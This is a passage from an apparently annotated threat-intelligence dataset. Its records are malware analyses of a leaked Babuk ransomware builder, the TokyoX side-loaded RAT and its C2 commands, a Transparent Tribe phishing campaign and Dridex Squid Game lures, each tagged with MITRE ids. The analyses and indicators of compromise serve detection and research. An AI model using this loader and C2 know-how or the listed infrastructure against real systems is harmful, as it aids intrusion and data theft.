Chuong Dong during his [great analysis](https://chuongdong.com/reverse%20engineering/2021/01/16/BabukRansomware-v3/) of the three versions of Babuk.\nWe were also able to also identify that this was a builder for their last version.\nAs the final comparison to ensure the authenticity of the sample, we compared the assembly code of both files using a plugin for IDA pro named Diaphora, and resulting to be almost identical.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/07.png) Not matching functions between real Babuk sample and built sample\n![](https://lab52.io/blog/wp-content/uploads/2021/07/06-1.png) Partial matching functions real Babuk sample vs. built sample\n![](https://lab52.io/blog/wp-content/uploads/2021/07/08.png)Perfect matching function from real Babuk sample vs. built sample\nAs it could be expected, the builder would take the content of note.txt and use it as the ransomware note that it would be dropped in the infected machines.\nSince Babuk decided not to use any packing mechanism, we could also spot in clear text the ransom note and the rest of the space reserved for the ransomware note inside the built binaries.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/09.png) Strings of built sample\n![](https://lab52.io/blog/wp-content/uploads/2021/07/10.png) Hex content of built sample\nAfter this, we decided to take a deeper look into the actual builder executable, and we found out that we could pass as a second argument an actual eliptic curve encyption key, instead of letting the builder generate it for us, allowing the ransomware operator to use the same decryption executable for different builds.\nFurthermore, it has been observed that, if no encyption key is specified as an argument, the key would be generated randomly.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/11-Copy-1024x729.png)\nArgument parsing of Babuk builder\nIt could also be predictable that the builder would use the binary files as templates, and we could identify this operations within the assembly code, where it would first read the \u201ctemplate\u201d file, modify it, and finally write the modification as a new file in the specified folder.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/12.png) Babuk builder read of binary files as Templates\n![](https://lab52.io/blog/wp-content/uploads/2021/07/13.png) Babuk builder write of output binary files\nSince Babuk binaries did not use any packer, anyone having these files and a deep knowledge about them, could have written this builder.\nHowever, according to the compilation dates which seem legit, we do not think this is the actual scenario.\nAbout the decrypter, we have not analyzed its code, but during the tests we realized that it does not contain the eliptic curve keys hardcoded, therefore it needs to be run from a command prompt located in the same folder than these generated keys.\nWe could also identify that it works, but it takes a ridiculous amount of time to decrypt go through the whole disk and decrypt all the files.\nThis could be considered important since new ransomware gangs could try to take advantage of this leak for their own Raas \u201cstartup\u201d.\nHowever, it is also valuable for researchers since it will allow us to generate better detection rules, or even track new unofficial variations of the ransomware family.", "mitre_ids": ["S0638", "T1486", "S0638", "T1486", "T1486", "T1486", "TA0010", "S0638", "S0638", "S0638", "T1486", "S0638", "S0638", "S0638", "T1486", "S0638", "T1486", "T1486", "S0638", "S0638", "S0638", "T1486", "S0638", "T1486", "T1486", "T1486", "S0638", "S0638", "S0638", "S0638", "T1486", "T1486"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "TokyoX: DLL side-loading an unknown artifact\nJanuary 10, 2022\nDuring Christmas holidays, Lab52 has been analyzing a sample which loads an artifact that we have decided to refer to as \u201cTokyoX\u201d since no similarities have been found as to any known malware, which we usually detect in open sources.\nHowever, we cannot confirm so far that it is indeed a new family of malware.\nThe first thing we identified was a DLL\n(382b3d3bb1be4f14dbc1e82a34946a52795288867ed86c6c43e4f981729be4fc) which had the following timestamps in VirusTotal at the time of the current analysis, and was uploaded from Russia via web site:\nCreation Time 2021-12-09 02:46:43\nFirst Submission 2021-12-09 08:48:20\nLast Submission 2021-12-09 08:48:20\nLast Analysis 2021-12-23 23:38:08\nSome antivirus engines tagged the sample as PlugX, but it seems that the attribution might be due to the final payload\u2019s loading mechanism: DLL sideloading with an encrypted payload in the same directory.\nAfter analyzing the final payload we could not find any similarities with other known samples from PlugX other than the loading TTPs.\nThis DLL had a related .zip file with the name \u043f\u043b\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435.zip (translated to as planning.zip).\nWhen unzipping, the following files are observed:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/00.png)\nThe legitimate file Creative.exe, an encrypted Data file and the version.dll DLL, which implements the loader function for the Data file, and therefore responsible of mapping the \u201cTokyoX\u201d.\nIf we execute it from a path which is not final or the expected by the malware, it replicates to another path and executes from there, which is something it does have in common with some PlugX dll loaders:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/01.png)\nOnce executed, we observe how the netsh.exe process tries to establish connections with port 443 of the IP address 31.192.107[.]187.\nIn this analysis we will focus on different aspects about the process; from double-clicking the binary 123.exe process (which is a copy of Creative.exe but in another path) to the execution of \u201cTokyoX\u201d already decrypted in memory.\nThe first thing we observe within the process is how the version.dll library prepares the decryption and the final payload\u2019s loading in the remote process:\nIn fact, we can see how the content of the Data file is read in the code section of version.dll:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/02-1024x387.png)\nIf we edit the Data file with a hexadecimal editor we will see their values, which will help us to identify it in memory later (beginning with E3 84):\n![](https://lab52.io/blog/wp-content/uploads/2022/01/03.png)\nAfter reading the file from disk, a child process netsh.exe is created.\nThis just-created child process is where several new memory segments will be located (a total of 5, including the final decrypted payload) to decrypt the final \u201cTokyoX\u201d payload.\nThe APIs which were observed for the creation and writing of the remote process are the native APIs NtAllocateVirtualmemory and NtwriteVirtualmemory.\nFirst, it creates two segments: 100Kb where the encrypted payload is located and which comes from the disc, and another one of 4Kb. In the 4Kb segment we observe how the following string is set (which will be the string used for the decrypting process):\n![](https://lab52.io/blog/wp-content/uploads/2022/01/04-1024x292.png)\nThe other memory segment of 100Kb contains the following (encrypted content, as we see how it matches the content from Data file on Disk):\n![](https://lab52.io/blog/wp-content/uploads/2022/01/05-1024x784.png)\nAfter the creation of these two segments, a third segment is allocated, where it is loaded the absolute memory addresses from several win32 APIs (VirtualAlloc, LoadLibrary, GetProcAddress, the home address of the coded payload, etc.for its later use by the loader:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/06.png)\nWe can notice how the segment will have the memory addresses (starting from 123.exe they are located in netsh.exe segment through the version.dll code):\n![](https://lab52.io/blog/wp-content/uploads/2022/01/07-1024x131.png)\nThen, another segment of 4Kb is created where it loads the code that will decrypt and load the final payload.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/08.png)\nFinally, the \u201cTokyoX\u201d loader runs from the DLL (version.dll) in netsh.exe through the API NtcreateThreadEx and we see the start of the last page created in the stack:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/09-1024x476.png)\nAfter the execution of NtCreateThreadEx, as indicated, the loader is initiated in netsh.exe in the segment:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/10.png)\nOnce the execution is moved to the netsh.exe process, it takes the string located in the initial 4Kb segment, copies it into the stack and replicates it (0x100, 256 bytes) to match the specific block size of 256bytes.\nIn the following screenshots we can observe how the block ends with the string \u201c!Up.\nwhen it reaches the value 0x100 in hexadecimal.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/11.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/12.png)\nAfter the block is created with the replicated string, the values from 00 to FF are found and used for the decrypting process.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/13.png)\nAt this point, the loader transforms the 00-FF block with a series of additions combining the replicated string\u2019s block with the 00-FF block, as we can see:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/14.png)\nThe combination of the blue block (in following image) and the 00-FF block (pointed in red in previous image) results in the following block in memory, marked in red in the image:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/15.png)\nOn the next step, the loader reads the initial argument, arg0, whose value is 0x900000 and points at the 4Kb block, which stores the absolute addresses to different API from Win32:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/16.png)\nAfter this, the decrypting process for the final payload begins.\nThe decrypting process gets two values from the second block, exchanges and adds them, and the result serves as a final index to recover the element from the second block with which the xor will be achieved through the coded block.\nThis description of the decryption algorythm has been identified as the **RC4 algorythm**.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/17.png)\nAfter the decryption process, we find a PE binary, as seen in the following image.\nIn this case, the payload does not start with the traditional MZ header but the string \u201ctokyo\u201d:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/18.png)\nThen, we see how it loads the VirtualAlloc absolute address (0x77211856) from the segment previously created:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/Screenshot-from-2022-01-10-16-37-59-1024x307.png)\nThis creates another memory segment in the process netsh.exe with RWX licenses (that of 116Kb) which will be used to load the PE:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/20-1024x89.png)\nIn this new segment, it maps the binary using the virtual addresses as the regular Windows PE loader would do.\nThen, it calls the API LoadLibraryA (it has the address since the DLL saved it in the memory segment) of the strings located in the mapped block:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/21-3-1024x363.png)\nThen it calls GetProcAddress() to get the addresses of certain functions:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/22-1024x441.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/23.png)\nNext, the libraries and functions block may be appreciated:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/24.png)\nAfter the correct mapping and having loaded the necessary libraries for its proper functioning, it calls EAX to run the decrypted and mapped payload:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/25-1024x452.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/26.png)\nTo summarize, this article goes through the process followed in memory after executing the Creative Cloud application until deploying TokyoX in memory.\nThis DLL sideloading style is often linked to APT groups whose attribution is also linked to China, however being a known technique as it is, we are not able to consider any feasible attribution at the moment.\nAs reviewed at the beginning of the article, what we have named as \u201cTokyoX\u201d has not been identified as a known malware so far (at least, with the sources that we have).\nAdditionally, at some point of the analysis we identified a tool used by this group for the creation of version.dll, which pretends to be a Windows DLL located in SysWOW/System32.\nThe string \u201cAheadLib\u201d found among the code of the malicious version.dll drew our attention, and we quickly found two chinese (casually or not) GitHub repositories with the source code of some tool called AheadLib.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/27.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/28.png)\nBasically, this tool will allow you to create a C++ source code file, implementing a DLL with the same exported functions as a given DLL.\nFor the purpose of the current analysis we generated a source code file using this tool and giving the legitimate version.dll as input.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/29.png)\nIn the shown screenshot we can see on the left side the pseudocode generated by IDA Pro while analyzing the malicious version.dll sample.\nOn the right side, we can observe the source code automatically generated by AheadLib using the legitimate version.dll as input.\nEven though the exported functions are not shown in the previous image, we can appreciate how there is a perfect match between both snippets.\nRead the second part of the analysis of the final \u201cTokyoX\u201d RAT and its capacities [here](https://lab52.io/blog/tokyox-dll-side-loading-an-unknown-artifact-part-2/).\n**IOCs**\n--------\n* 382b3d3bb1be4f14dbc1e82a34946a52795288867ed86c6c43e4f981729be4fc\n* 31.192.107[.]187:443\nCustomers with Lab52\u2019s APT intelligence private feed service already have more tools and means of detection for this campaign.\nIn case of having threat hunting service or being client of S2Grupo CERT, this intelligence has already been applied.\nIf you need more information about Lab52\u2019s private APT intelligence feed service, you can contact us through the [following link](https://lab52.io/contact)", "mitre_ids": ["T1574", "S0013", "T1574", "S0013", "S0013", "T1574", "S0108", "T1071", "T1204", "T1140", "S0108", "T1140", "T1140", "T1055", "T1055", "T1055", "T1129", "T1055", "T1055", "T1140", "T1055", "S0108", "T1129", "S0108", "T1546", "S0108", "T1546", "T1620", "T1620", "T1129", "T1140", "T1140", "T1140", "T1140", "T1055", "T1140", "S0108", "T1055", "T1055", "T1140", "T1574"], "anno_name_label": [["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"]], "cti_entity_class": ["CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "TokyoX: DLL side-loading an unknown artifact (Part 2)\nJanuary 12, 2022\nAs we mentioned in [the previous post](https://lab52.io/blog/tokyox-dll-side-loading-an-unknown-artifact/), we have performed an analysis of the threat which, lacking further information, we have not been able to identify it as a known threat.\nThus, for the moment, we will keep referring to it as TokyoX.\nThis threat can only be found in memory, since it is encrypted on disk and its loading is performed as described in the previous post.\nAfter the whole loading process, the first thing the threat does is to check for the existence of a mutex in the system with the name \u201caftdoslm\u201d and if it finds it, it terminates its execution in order to avoid multiple instances of the threat running in parallel.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/1.png)\nIt then generates a 32-character string similar to a md5 hash from the computer\u2019s file system and Volume information, which is used as the victim ID and placed at the beginning of every packet it sends to the command and control server:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/2.png)\nIt then obtains the user name, computer name, local IP and operating system version, with which it builds a string and generates a first packet for the C2:\nAt the time of the analysis the command and control server was not available.\nFor that reason, some fields of the packets a priori not used by the threat, could not be identified.\nHowever, from the analysis of the threat assembly, it has been possible to observe that the response of the C2 is very similar to those sent by the threat, since it most likely contains the first 44 bytes of the threat request or a very similar content: the victim ID (in red) , the first three dwords (in green).\nAfter that part, it will have a fourth dword (in blue) that consists of a command code supported by the threat, after which, depending on the command, it may contain one information or another (in yellow).\n![](https://lab52.io/blog/wp-content/uploads/2022/01/3.png)\nThe command code in question goes in LittleEndian, so for the command 7010, the field should contain \u201c10 70 00 00\u201d.\nInside the threat code, a switch can be found that identifies 6 different commands:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/4-1024x332.png)\nThe first one is \u201c6010\u201d, which can be seen in the screenshot along with the contents of the network packet.\nThis command is not among the options accepted by the threat, but it is the one that the threat itself uses when it sends the first packet to the command and control server, and we assume that it is the one used as a beacon when it does not intend to do anything, since a command that is not supported by the switch statement will simply cause a 5-minute sleep and a new request to C2 after this time.\nSecond comes the \u201c6011\u201d command which is relatively interesting since it first calls a function that will delete all the infection files and terminate the execution of the threat.\nThe fact that makes it interesting to us is that after this call, inside the switch that controls each command, it appears again as a command to perform no action (in this case it should be the 6010 probably) and make another request to C2, although this code will never be executed because the initial function will close the process.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/5.png)\nThe next command is \u201c7010\u201d which scans the disks installed in the computer using the \u201cGetLogicalDriveStringsW\u201d API and sends the results to the command and control server.\nThe command \u201c7011\u201d imitates the \u201cDir\u201d command as it receives after the code a folder path, and allows it to list the content of a folder, showing hidden and system files too.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/6.png)\nThe next command \u201c7017\u201d expects, after the command code, a structure with three dwords followed by a path with a filename, and allows to upload a file from the attacking computer to the victim machine.\nIn order to do so, it first creates an empty file and then generates a new thread that will make a second request to the command and control server.\nWithin the response from the C2, this request expects the contents of the file to be uploaded, which the requesting thread will store in the file generated by the main thread.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/7.png)\nSimilarly, the command \u201c7018\u201d also expects after the command code a structure with three dwords, identical to the \u201c7017\u201d command, followed by a path with a filename.\nIn this case, it generates a new thread that tries to read that file within the victim computer and makes a second request to the C2 containing the raw content, allowing the attacker to exfiltrate files from the infected computer.\nWith respect to the three dwords received before the file path, it has only been possible to identify the third one for the moment, which consists of the total size of the file to be sent or received and is used before obtaining the file to reserve a buffer of that size, plus one in the Heap of the application in order to recover the content there before dumping it to disk or reading it from disk.\nFinally, there is the \u201c8001\u201d command with a command string to be run in a cmd.exe shell, since it calls CreateProcessW for \u201ccmd.exe\u201d with the input and output redirected by anonymous pipes to the executable itself.\nThen, it executes the command received in the request and replies to the C2 with the output of that command, thus forming a remote Shell of the victim machine.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/8.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/9.png)\nAlthough **we do not have enough evidence to make any kind of attribution**, there are some characteristic TTPs in the infection chain: the attacker using a Dll-sideload with a legitimate binary and a library, the fact that the library is responsible for decrypting and executing a third encrypted file in memory, and the fact of removing the MZ characters from the beginning of the binary and replacing them with another string.\nThis last characteristic is very common in APT groups that use PlugX as the main threat, where instead of using \u201ctokyo\u201d to replace MZ, they usually add \u201cplug\u201d at the beginning, which has motivated the name of the threat.\nAll of this explains [the attribution of this hash to PlugX](https://www.virustotal.com/gui/file/382b3d3bb1be4f14dbc1e82a34946a52795288867ed86c6c43e4f981729be4fc/detection) by some antivirus engines, although as it has been observed in the post, it is a somewhat smaller threat, which is not developed in Delphi as plugx and that keeps a greater resemblance to HttpBrowser in terms of capabilities.\nHowever, HttpBrowser does not share code or style of command codes with this sample, so it is most likely a different tool for the first infection stage.\n| aftdoslma | Mutex |\n| C:\\Users\\Public\\Z46F4501-F44G-4DLS-AV8E-4E4DFDY918FG-DL5F102TVSFG7 | Path |\n| 382b3d3bb1be4f14dbc1e82a34946a52795288867ed86c6c43e4f981729be4fc | Dll |\n| 3493331e8f6151a37a48d11243e0fa32e756e8ca78a454912630865b48a43693 | TokyoX ciphered |\n| 6370aa86e4bd2079913553bf34a5fe983b54d4907d168b278d6fe3caaf278d13 | Zip File |\n| 31.192.107[.]187:443 | C2 |\nCustomers with Lab52\u2019s APT intelligence private feed service already have more tools and means of detection for this campaign.\nIn case of having threat hunting service or being client of S2Grupo CERT, this intelligence has already been applied.\nIf you need more information about Lab52\u2019s private APT intelligence feed service, you can contact us through the [following link](https://lab52.io/contact)", "mitre_ids": ["T1083", "T1083", "TA0011", "T1082", "TA0011", "T1033", "T1049", "TA0011", "TA0011", "TA0011", "TA0011", "T1070", "TA0011", "T1041", "T1005", "T1005", "T1105", "TA0011", "TA0011", "TA0011", "TA0011", "T1041", "T1059", "TA0011", "T1059", "T1059", "T1574", "S0013", "S0013", "S0013", "S0070", "S0070", "TA0011"], "anno_name_label": [["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"], ["MALWARE", "TokyoX"]], "cti_entity_class": ["CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "New TransparenTribe Operation: Targeting India with weaponized COVID-19 lure documents\nJanuary 24, 2022\nOver the last months, lab52 has been researching an attack campaign which targets government and military personnel of India.\nIn fact, targeting the Indian government seems to be one of the key indicators of the group that may be behind this attack.\nFurthermore, some of the artifacts and infrastructure used to carry out the novel infection campaign are strongly related to the threat group Transparent Tribe.\nInitially, Lab52 detected a suspicious IMG file (Covid\\_Letter.img \u2013 948dffef9a11c11a6d81905e59ca1882) that was uploaded in VirusTotal via the web site from India, with upload date 09-06-2021.\nThis file may have been sent attached to an email and contains a PDF document and some artifacts in order to display a decoy PDF to the user and initiate the infection process in the background.\nThe PDF is named Vaccination06042021.pdf and its contents are related to COVID vaccination for employees over 45 years of age at the Central Administration of the Government of India.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/1-2-810x1024.png)\nAlthough this decoy PDF document is harmless, the IMG file contains some other artifacts that will carry out the infection.\nFirstly, the IMG file contains a shortcut with the same name as the PDF document, which will be in charge of starting the infection by launching a Visual Basic script called doc.vbs.\nThe infection chain continues executing both the decoy PDF document and a Windows PE (ServiceHub.MsDetouredHost.exe \u2013 68d73d596a7103e517967f7f4e22cecb) which after being analyzed, we have been able to identify it as a Python/PeppyRAT.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/2v2-2-1024x843.jpg)\nThe main feature of this Windows executable is the ability to run embedded Python commands from itself.\nFor this, the threat firstly relaunches itself and then starts building a new IAT (*Import Address Table*) referencing a large number of Python functions contained in the Python27.dll library that will be executed later.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/3-2-1024x413.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/4-1-1024x604.png)\nThe crux of the matter is that by dropping all python compiled objects and dynamic-link libraries required into %TEMP% directory, it makes this python command execution technique possible through a Windows PE file.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/5-2.png)\nAn example of python command execution though a Windows PE can be seen below:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/6-2.png)\nOnce the threat gets its environment all set, it builds and loads into memory a Python script that will be in charge of obtaining the list of running processes and notifying the command-and-control server through an HTTP POST request.\nNext, in the following code block it is shown the script load by iterations:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/7-2.png)\n![](https://lab52.io/blog/wp-content/uploads/2022/01/8-2.png)\nAs a result, we have a python script composed by seven functions plus its main function.\nThis script will notify to the C2C the extracted computer info and also set persistence into the victim machine.\nMost important python functions are the following:\n**Function 1 \u2013 Name:***setdelimeters*\n**Description:** Collect computer data: Get list of running processes\n![](https://lab52.io/blog/wp-content/uploads/2022/01/9-1.png)\n**Function 2 \u2013 Name:** *getallusready*\n**Description:** Collect computer data: Get OS version and machine name\n![](https://lab52.io/blog/wp-content/uploads/2022/01/10-2.png)\n**Function 3 \u2013 Name:** *simplify*\n**Description:** Set persistence mechanism through Windows startup folders in the current user context\n![](https://lab52.io/blog/wp-content/uploads/2022/01/11-2.png)\n**Function 4 \u2013 Name:** *synchronize*\n**Description:** Send collected information to the command-and-control server\n![](https://lab52.io/blog/wp-content/uploads/2022/01/12-2.png)\nAs for network communications, as seen in the synchronize python function, the threat sends the list of running processes obtained, the OS version and the username through an HTTP request.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/13-2-1024x211.png)\nThis domain, where the C2C is hosted, resolves to an IP address that belongs to Digital Ocean VPS service.\nSo, the threat actors make use of this infrastructure to take control of compromised computers and carry out actions from their C2C.\nResolution history:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/14-2.png)\nFinally, as a persistence mechanism, *simplify* function drops a new Windows PE file into the current user startup folder: (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\devenv.defender.scr).\nThis later artifact has been developed in .NET framework and its purpose is very simple: waiting to receive a new infection module from the C2C, which is a DLL file named mscontainer.dll:\n![](https://lab52.io/blog/wp-content/uploads/2022/01/15-2.png)\nSo far, we analyzed a threat whose main capabilities are for initial access and recognition of the compromised computer as a common operational characteristic of the threat group, in order to detect if the malware was executed in a sandbox or others analysis environments.\nTherefore, we could consider it as the first stage and wait for new artifacts from the command-and-control server.\nThe Windows DLL *mscontainer.dll* sent afterwards by the C2C seems to be the next stage of infection.\nRemember that this artifact is expected by the last analyzed PE devenv.defender.scr which persists on the Windows startup folders.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/16-2.png)\nThe analyzed *mscontainer.dll* sample, also developed in .NET, is composed of 10 functionalities plus its main function.\n![](https://lab52.io/blog/wp-content/uploads/2022/01/17-3-1024x336.png)\nThe threat-analysis has allowed us to obtain 37 decrypted strings, the commands accepted by the C2C and its hosted domain and others related to their capabilities, etc.\nThe most outstanding ones being considered:\n* senddevices\n* same\n* OS\n* Intranet\n* Start\n* Pending\n* result\n* done\nFor the time being, no new infection scenarios and/or modules implemented by the C2C server have been obtained.\nHowever, variations in the names of the artifacts that keeps the same infection chain have been detected.\nOn the whole, this infection campaign seems to be related to the threat group Transparent Tribe, trying to compromise Indian government once again.\nThis assumption is based on the fact that the PDF content targeted to the government of India and the TTPs employed during the infection process are common on this group.\nEven though this threat group usually deploys CrimsonRAT as an initial access threat, this time they have deployed PeppyRAT.\nSo, it could be considered a variation of the TTPs related to the APT group Transparent Tribe.\nFurthermore, no similarities have been found to any know malware in the mscontainer.dll artifact.\nIn fact, it could be indeed a new malware developed by the threat group.\n**INDICATORS OF COMPROMISE:**\nARTIFACTS:\n| **FILENAME** | **SHA1** |\n| Covid\\_Letter.img | c060431e55db84a195241be1cffdbdc30f42d666 |\n| ServiceHub.MsDetouredHost.exe | 37dfea2d3e123ad91a8782debccb8f5c923b1a37 |\n| devenv.defender.scr | 226781c376d6b4bdb8935dc98f645744da41ef68 |\n| doc.vbs | f4ccf4dfcd6966eaa0b96b3977266113d71c5fa8 |\n| Vaccination06042021.PDF | aa9eb957a3f46dc6a3d300c730c2d3892f577100 |\n| Vaccination06042021.pdf.lnk | 9e27af77135943714bd5821f628c53af9a3f5fc9 |\n| mscontainer.dll | cfe0dba23fb55450d158731a35097de6c34679bd |\nNETWORK:\n| **Domain** |\n| iwestcloud[.]com |\n| zoneflare[.]com |\n| **IP Address** |\n| 167.99.40[.]13 |\n| 46.101.202[.]66 |\nRELATED INDICATORS:\n| **FILENAME** | **SHA1** |\n| tracking\\_notice.xls | c65bb0e553dcc2ee68f24a862766cf1a813f0e0f |\n| mybinder.exe | 4c5d43a71a24f4aa60f28613f2e26845418f4304 |\n| uipool.scr | e4f90256b82b7d09bdd5c622982a20fe064ae7a9 |\nMITRE TTPs:\n| **TECHNIQUE ID** | **Name** |\n| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |\n| T1566.001 | Phishing: Spearphishing Attachment |\n| T1059.006 | Command and Scripting Interpreter: Python |\n| T1057 | Process discovery |\n| T1046 | Network Service Scanning |\n| T1041 | Exfiltration Over C2 Channel |\n| T1568 | Dynamic Resolution |\n| T1005 | Data from Local System |\nCustomers with Lab52\u2019s APT intelligence private feed service already have more tools and means of detection for this campaign.\nIn case of having threat hunting service or being client of S2Grupo CERT, this intelligence has already been applied.\nIf you need more information about Lab52\u2019s private APT intelligence feed service, you can contact us through the [following link](https://lab52.io/contact)", "mitre_ids": ["G0134", "T1566", "T1566", "T1204", "T1059", "S0643", "T1055", "T1059", "T1059", "T1059", "T1055", "T1059", "T1055", "T1059", "T1071", "T1059", "TA0011", "TA0003", "TA0011", "T1005", "T1059", "T1057", "T1005", "T1547", "T1041", "T1071", "TA0011", "TA0011", "TA0003", "T1055", "T1547", "T1547", "TA0011", "T1105", "TA0001", "T1497", "T1105", "TA0011", "T1105", "T1547", "TA0011", "TA0011", "G0134", "T1566", "S0115", "TA0001", "S0643", "G0134", "T1547", "T1566", "T1059", "T1057", "T1041", "T1568", "T1005"], "anno_name_label": [], "cti_entity_class": ["CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "TA575 Uses \u2018Squid Game\u2019 Lures to Distribute Dridex malware\nOctober 28, 2021\nProofpoint identified the large cybercrime actor TA575 distributing Dridex malware using\u00a0[Squid Game](https://www.netflix.com/title/81040344)\u00a0lures.\nThe threat actor is purporting to be entities associated with the Netflix global phenomenon using emails enticing targets to get early access to a new season of Squid Game or to become a part of the TV show casting.\nOn October 27, 2021, Proofpoint observed thousands of emails targeting all industries primarily in the United States.\nThe emails used subjects such as:\u00a0\n* Squid Game is back, watch new season before anyone else.\n* Invite for Customer to access the new sesason.[sic]\n* Squid game new season commercials casting preview\n* Squid game scheduled season commercials talent cast schedule\n![image-20211028123421-1](/sites/default/files/inline-images/image-20211028123421-1.jpeg)\u00a0\n*Figure 1: Netflix Squid Game email lure inviting customers to get early access to a new season*\n![image-20211028123458-2](/sites/default/files/inline-images/image-20211028123458-2.jpeg)\n*Figure 2: Netflix Squid Game email lure soliciting actors and background talent to apply to be on the show or show commercials*\nThe emails tell the victim to fill out either an attached document to get early access to the new season of the show or a talent form to become part of the background casting.\nThe attachments are Excel documents with macros that, if enabled, will download the Dridex banking trojan affiliate id \u201c22203\u201d from Discord URLs.\nDridex is a prolific banking trojan distributed by multiple affiliates that can lead to data theft and installation of follow-on malware such as ransomware.\n![image-20211028123529-3](/sites/default/files/inline-images/image-20211028123529-3.png)\n*Figure 3: One of the several Excel attachment lures observed in this campaign*\nTA575 is a Dridex affiliate tracked by Proofpoint since late 2020.\nThis group distributes malware via malicious URLs, Microsoft Office attachments, and password-protected files.\nOn average, TA575 sends thousands of emails per campaign impacting hundreds of organizations.\nTA575 also uses the Discord content delivery network (CDN) to host and distribute Dridex.\nDiscord, a communications platform with consumer and enterprise uses, is an increasingly popular malware hosting service for cybercriminals.\nTA575 themes generally include invoicing and payments, but occasionally include popular news, events, and cultural references.\nCybercriminal threat actors in general have pounced on Squid Game as a popular lure and\u00a0[malware theme](https://www.techrepublic.com/article/you-definitely-dont-want-to-play-squid-game-themed-malware-is-here/).\nThis makes sense; as Squid Game is Netflix\u2019s \u201c[biggest ever](https://www.cnn.com/2021/10/12/media/squid-game-netflix-viewership/index.html)\u201d series, the pool of potential victims who would inadvertently interact with malicious content associated with it is higher than a general lure theme.\nTA575 is betting the invitation to be part of the upcoming season will entice more users to interact with the malicious Microsoft Excel file.\nProofpoint observed the following indicators of compromise:\n| **Indicator** | **Description** |\n| 85d2fe6405aac0816f7286bc26174151ae69a08210aec78fea5628862489d8ac\u00a0 | Dridex\u00a0SHA256\u00a0 |\n| 149[.]202[.]179[.]100:443\u00a0 | Dridex\u00a0C2\u00a0 |\n| 66[.]147[.]235[.]11:6891\u00a0 | Dridex\u00a0C2\u00a0 |\n| 81[.]0[.]236[.]89:13786\u00a0 | Dridex\u00a0C2\u00a0 |\n| hxxps[:]//cdn[.]discordapp[.]com/\u00a0\nattachments/902882967184113677/902908322359959602/xEljRErMuphgnb[.]dll\u00a0 | Excel Payload\u00a0 |\n| 